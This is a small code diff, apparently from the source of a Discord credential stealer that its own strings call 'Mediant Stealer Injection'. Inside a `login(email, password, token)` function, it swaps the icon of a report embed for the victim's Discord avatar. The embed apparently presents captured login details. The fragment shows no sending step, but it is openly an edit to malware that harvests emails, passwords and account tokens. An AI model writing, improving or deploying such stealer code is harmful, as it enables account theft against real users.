@@ -677,7 +677,7 @@ const login = async (email, password, token) => {
         ],
         author: {
           name: `Mediant Injection Info,
-          icon_url: `https://raw.githubusercontent.com/Themediant/lagnewalisui/main/img/xd.jpg`,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
           text: '🎉・Mediant Stealer Injection',
